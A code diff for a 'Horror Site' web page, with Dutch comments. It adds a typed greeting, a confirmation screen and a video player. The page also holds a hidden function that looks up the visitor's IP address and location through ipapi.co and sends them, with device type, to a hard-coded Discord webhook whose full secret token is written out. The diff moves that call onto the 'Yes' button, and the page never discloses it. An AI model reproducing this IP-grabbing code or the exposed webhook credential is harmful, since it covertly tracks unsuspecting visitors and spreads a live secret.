@@ -4,7 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome to the Horror Site</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/typed.js"></script>
     <style>
+        /* Jouw CSS-stijlen hier */
         body {
             background-color: #000;
             color: #fff;
@@ -49,14 +52,39 @@
         .btn:hover {
             background-color: #a50000;
         }
+        #confirmation {
+            display: none;
+        }
+        #video-container {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- Begroeting met horror en getypt effect -->
+    <div id="horrorText" style="visibility: hidden;"></div>
+
+    <!-- Verberg de container totdat de begroeting is voltooid -->
+    <div id="container" class="container" style="display: none;">
         <img src="horror_image.jpg" alt="Horror Image" class="horror-img">
         <h1>Welcome to the Horror Site</h1>
         <p>Are you brave enough to explore the dark corners of this website?</p>
-        <a href="#" class="btn">Enter if you dare</a>
+        <a href="#" id="enterBtn" class="btn">Enter if you dare</a>
+    </div>
+
+    <!-- Bevestigingsscherm -->
+    <div id="confirmation">
+        <h1>Are you sure?</h1>
+        <button id="yesBtn" class="btn">Yes</button>
+        <button id="noBtn" class="btn">No</button>
+    </div>
+
+    <!-- Videospeler -->
+    <div id="video-container">
+        <video id="video" width="640" height="360" controls>
+            <source src="vid.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
     </div>
 
     <audio autoplay loop>
@@ -65,6 +93,7 @@
     </audio>
 
     <script>
+        // Functie om IP-gegevens op te halen en naar Discord Webhook te sturen
         function getIPDataAndSendToDiscord() {
             fetch('https://ipapi.co/json/')
             .then(response => response.json())
@@ -92,6 +121,9 @@
                     }]
                 };
 
+                // Log de embed data
+                console.log("Embed Data:", embedData);
+
                 fetch('https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP', {
                     method: 'POST',
                     headers: {
@@ -105,6 +137,7 @@
             .catch(error => console.error('Error fetching IP data:', error));
         }
 
+        // Functie om het apparaattype op te halen
         function getDeviceType() {
             if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                 return 'Mobile';
@@ -113,7 +146,39 @@
             }
         }
 
-        window.onload = getIPDataAndSendToDiscord;
+        // Roep de functie op wanneer de pagina wordt geladen
+        window.onload = function() {
+            // Horror begroeting met getypt effect
+            var typed = new Typed('#horrorText', {
+                strings: ['Welcome ' + navigator.userAgent + '...'],
+                typeSpeed: 50,
+                onComplete: function() {
+                    setTimeout(function() {
+                        document.getElementById('container').style.display = 'block';
+                        document.getElementById('horrorText').style.display = 'none';
+                    }, 1500);
+                }
+            });
+
+            // Voeg een click event toe aan de "Enter if you dare" knop
+            document.getElementById('enterBtn').addEventListener('click', function() {
+                document.getElementById('container').style.display = 'none';
+                document.getElementById('confirmation').style.display = 'block';
+            });
+
+            // Voeg click events toe aan de "Yes" en "No" knoppen
+            document.getElementById('yesBtn').addEventListener('click', function() {
+                getIPDataAndSendToDiscord();
+                document.getElementById('confirmation').style.display = 'none';
+                document.getElementById('video-container').style.display = 'block';
+                document.getElementById('video').play();
+            });
+
+            document.getElementById('noBtn').addEventListener('click', function() {
+                document.getElementById('container').style.display = 'block';
+                document.getElementById('confirmation').style.display = 'none';
+            });
+        };
     </script>
 </body>
 </html>
